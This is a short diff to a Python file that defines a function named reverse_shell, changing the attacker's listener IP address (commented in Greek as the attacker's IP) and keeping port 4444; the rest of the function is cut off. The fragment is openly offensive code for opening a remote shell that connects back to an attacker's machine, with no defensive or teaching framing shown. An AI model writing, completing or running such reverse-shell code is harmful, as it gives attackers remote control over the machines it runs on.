@@ -3,7 +3,7 @@ import subprocess
 import os
 
 def reverse_shell():
-    host = "192.168.1.10"  # IP του επιτιθέμενου (listener)
+    host = "192.168.2.14"  # IP του επιτιθέμενου (listener)
     port = 4444            # Θύρα για σύνδεση
 
     try:
